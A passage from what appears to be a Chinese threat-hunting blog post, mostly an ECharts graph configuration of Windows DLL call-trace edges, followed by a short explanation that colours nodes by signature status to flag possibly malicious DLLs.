            {'name': 'c:\\windows\\system32\\advapi32.dll'},
            {'name': 'c:\\windows\\system32\\kernelbase.dll'},
            {'name': 'unknown(00007ffa86c2f3fc)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'c:\\windows\\system32\\hostui.exe',
             'itemStyle': {'color': 'red'},
             'label': {'show': true}}
            ],
          edges: [
              {'source': 'c:\\windows\\system32\\winsta.dll',
               'target': 'c:\\windows\\system32\\wtsapi32.dll'},
              {'source': 'c:\\windows\\system32\\hostui.exe',
               'target': 'c:\\windows\\system32\\kernel32.dll'},
              {'source': 'c:\\windows\\system32\\kernel32.dll',
               'target': 'c:\\windows\\temp\\python.exe'},
              {'source': 'c:\\windows\\system32\\sechost.dll',
               'target': 'c:\\windows\\system32\\kernel32.dll'},
              {'source': 'c:\\windows\\system32\\wtsapi32.dll',
               'target': 'c:\\windows\\system32\\perfts.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\mscorlib\\ce65e35ae3e57af12f3515300d00e518\\mscorlib.ni.dll',
               'target': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll'},
              {'source': 'c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\corperfmonext.dll',
               'target': 'c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\mscoreei.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system.manaa57fc8cc#\\fa56adb2347ed3a045d8f7471018af68\\system.management.automation.ni.dll',
               'target': 'unknown(00007ffa51295251)'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll',
               'target': 'unknown(00007ffa757f7045)'},
              {'source': 'unknown(00007ffa86ba4e6b)',
               'target': 'unknown(00007ffa86c2f3fc)'},
              {'source': 'unknown(00007ffa86d327df)',
               'target': 'unknown(00007ffa512a3a51)'},
              {'source': 'c:\\windows\\system32\\kernelbase.dll',
               'target': 'c:\\windows\\system32\\kernel32.dll'},
              {'source': 'c:\\windows\\system32\\rpcrt4.dll',
               'target': 'c:\\windows\\system32\\rpcrt4.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll',
               'target': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\microsoft.pae3498d9#\\412e4e144df545096d7fbb3c9f354ca9\\microsoft.powershell.commands.management.ni.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll',
               'target': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\microsoft.p521220ea#\\415482eab2cad62fc2e51e85d36c1ee7\\microsoft.powershell.commands.utility.ni.dll'},
              {'source': 'c:\\windows\\system32\\winsta.dll',
               'target': 'c:\\windows\\system32\\winsta.dll'},
              {'source': 'c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\mscoreei.dll',
               'target': 'c:\\windows\\system32\\advapi32.dll'},
              {'source': 'c:\\windows\\system32\\ntdll.dll',
               'target': 'c:\\windows\\system32\\winsta.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\microsoft.pae3498d9#\\412e4e144df545096d7fbb3c9f354ca9\\microsoft.powershell.commands.management.ni.dll',
               'target': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system.manaa57fc8cc#\\fa56adb2347ed3a045d8f7471018af68\\system.management.automation.ni.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll',
               'target': 'unknown(00007ffef22a01f3)'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system.manaa57fc8cc#\\fa56adb2347ed3a045d8f7471018af68\\system.management.automation.ni.dll',
               'target': 'unknown(00007ffef1df3991)'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll',
               'target': 'unknown(00007ffa757d7955)'},
              {'source': 'c:\\windows\\system32\\pla.dll',
               'target': 'c:\\windows\\system32\\pla.dll'},
              {'source': 'c:\\windows\\system32\\ntdll.dll',
               'target': 'c:\\windows\\system32\\ntdll.dll'},
              {'source': 'c:\\windows\\system32\\mscoree.dll',
               'target': 'c:\\windows\\system32\\advapi32.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll',
               'target': 'unknown(00007ffa757f1615)'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll',
               'target': 'unknown(00007ffa75a81b74)'},
              {'source': 'c:\\windows\\system32\\javamtsup.exe',
               'target': 'c:\\windows\\system32\\sechost.dll'},
              {'source': 'c:\\windows\\system32\\perfts.dll',
               'target': 'c:\\windows\\system32\\advapi32.dll'},
              {'source': 'c:\\windows\\system32\\hostui.exe',
               'target': 'c:\\windows\\system32\\hostui.exe'},
              {'source': 'c:\\windows\\system32\\advapi32.dll',
               'target': 'c:\\windows\\system32\\advapi32.dll'},
              {'source': 'c:\\windows\\system32\\kernel32.dll',
               'target': 'c:\\windows\\system32\\ntdll.dll'},
              {'source': 'c:\\windows\\system32\\ntdll.dll',
               'target': 'c:\\windows\\system32\\kernelbase.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\microsoft.p521220ea#\\415482eab2cad62fc2e51e85d36c1ee7\\microsoft.powershell.commands.utility.ni.dll',
               'target': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system.manaa57fc8cc#\\fa56adb2347ed3a045d8f7471018af68\\system.management.automation.ni.dll'},
              {'source': 'c:\\windows\\system32\\kernelbase.dll',
               'target': 'c:\\windows\\system32\\hostui.exe'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system.manaa57fc8cc#\\fa56adb2347ed3a045d8f7471018af68\\system.management.automation.ni.dll',
               'target': 'unknown(00007ffef1df5251)'},
              {'source': 'c:\\windows\\system32\\kernelbase.dll',
               'target': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\mscorlib\\ce65e35ae3e57af12f3515300d00e518\\mscorlib.ni.dll'},
              {'source': 'unknown(00007ffa86c2f3fc)',
               'target': 'unknown(00007ffa86d327df)'},
              {'source': 'unknown(00007ffef1d96620)',
               'target': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system.manaa57fc8cc#\\fa56adb2347ed3a045d8f7471018af68\\system.management.automation.ni.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\microsoft.pae3498d9#\\412e4e144df545096d7fbb3c9f354ca9\\microsoft.powershell.commands.management.ni.dll',
               'target': 'unknown(00007ffa86c4c623)'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system.manaa57fc8cc#\\fa56adb2347ed3a045d8f7471018af68\\system.management.automation.ni.dll',
               'target': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system.manaa57fc8cc#\\fa56adb2347ed3a045d8f7471018af68\\system.management.automation.ni.dll'},
              {'source': 'c:\\windows\\system32\\kernel32.dll',
               'target': 'c:\\windows\\system32\\javamtsup.exe'},
              {'source': 'c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\corperfmonext.dll',
               'target': 'c:\\windows\\system32\\mscoree.dll'},
              {'source': 'c:\\windows\\system32\\rpcrt4.dll',
               'target': 'c:\\windows\\system32\\ntdll.dll'},
              {'source': 'c:\\windows\\system32\\kernel32.dll',
               'target': 'c:\\users\\pbeesly\\appdata\\local\\temp\\_mei29522\\python27.dll'},
              {'source': 'c:\\windows\\system32\\kernelbase.dll',
               'target': 'c:\\windows\\system32\\pla.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll',
               'target': 'unknown(00007ffa757cf7d1)'},
              {'source': 'unknown(00007ffef1d96620)',
               'target': 'unknown(00007ffef1d96620)'},
              {'source': 'c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\corperfmonext.dll',
               'target': 'c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\corperfmonext.dll'},
              {'source': 'c:\\windows\\system32\\perfts.dll',
               'target': 'c:\\windows\\system32\\perfts.dll'},
              {'source': 'c:\\windows\\system32\\pla.dll',
               'target': 'c:\\windows\\system32\\rpcrt4.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll',
               'target': 'unknown(00007ffa757ddc5b)'},
              {'source': 'c:\\windows\\system32\\ntdll.dll',
               'target': 'c:\\windows\\system32\\kernel32.dll'},
              {'source': 'c:\\windows\\system32\\advapi32.dll',
               'target': 'c:\\windows\\system32\\kernelbase.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\mscorlib\\ce65e35ae3e57af12f3515300d00e518\\mscorlib.ni.dll',
               'target': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\mscorlib\\ce65e35ae3e57af12f3515300d00e518\\mscorlib.ni.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\microsoft.pae3498d9#\\412e4e144df545096d7fbb3c9f354ca9\\microsoft.powershell.commands.management.ni.dll',
               'target': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\microsoft.pae3498d9#\\412e4e144df545096d7fbb3c9f354ca9\\microsoft.powershell.commands.management.ni.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system.manaa57fc8cc#\\fa56adb2347ed3a045d8f7471018af68\\system.management.automation.ni.dll',
               'target': 'unknown(00007ffa757e33f1)'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll',
               'target': 'unknown(00007ffa7580bb48)'},
              {'source': 'c:\\windows\\temp\\python.exe',
               'target': 'c:\\windows\\temp\\python.exe'},
              {'source': 'c:\\windows\\system32\\kernelbase.dll',
               'target': 'c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\corperfmonext.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll',
               'target': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system.manaa57fc8cc#\\fa56adb2347ed3a045d8f7471018af68\\system.management.automation.ni.dll'},
              {'source': 'unknown(00007ffa86c4c623)',
               'target': 'unknown(00007ffa86ba4e6b)'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll',
               'target': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll',
               'target': 'unknown(00007ffef1e0f7d1)'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll',
               'target': 'unknown(00007ffa758a1df6)'},
              {'source': 'c:\\windows\\system32\\kernelbase.dll',
               'target': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll'},
              {'source': 'c:\\windows\\system32\\kernelbase.dll',
               'target': 'c:\\windows\\system32\\kernelbase.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll',
               'target': 'unknown(00007ffef1d96620)'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\microsoft.p521220ea#\\415482eab2cad62fc2e51e85d36c1ee7\\microsoft.powershell.commands.utility.ni.dll',
               'target': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\microsoft.p521220ea#\\415482eab2cad62fc2e51e85d36c1ee7\\microsoft.powershell.commands.utility.ni.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system.manaa57fc8cc#\\fa56adb2347ed3a045d8f7471018af68\\system.management.automation.ni.dll',
               'target': 'unknown(00007ffef1e15251)'},
              {'source': 'c:\\windows\\system32\\kernel32.dll',
               'target': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll'},
              {'source': 'c:\\windows\\system32\\kernelbase.dll',
               'target': 'c:\\windows\\system32\\perfts.dll'},
              {'source': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll',
               'target': 'unknown(00007ffa757d197c)'},
              {'source': 'c:\\windows\\temp\\python.exe',
               'target': 'c:\\windows\\system32\\kernel32.dll'},
              {'source': 'c:\\users\\pbeesly\\appdata\\local\\temp\\_mei29522\\python27.dll',
               'target': 'c:\\users\\pbeesly\\appdata\\local\\temp\\_mei29522\\python27.dll'}
            ],
          lineStyle: {
            opacity: 0.9,
            width: 2,
            curveness: 0
          }
        }
      ]
    };
    

![image](https://image.3001.net/images/20220216/1645002443_620cbecba00615c74fd4c.png!small)

其中，红色是签名状态为“Unavailable”的 DLL，黄色是 CallTrace 中的 unknown
节点（Why？），蓝色是签名状态为“Valid”的 DLL，

可以识别出可能是“恶意”的 DLL。

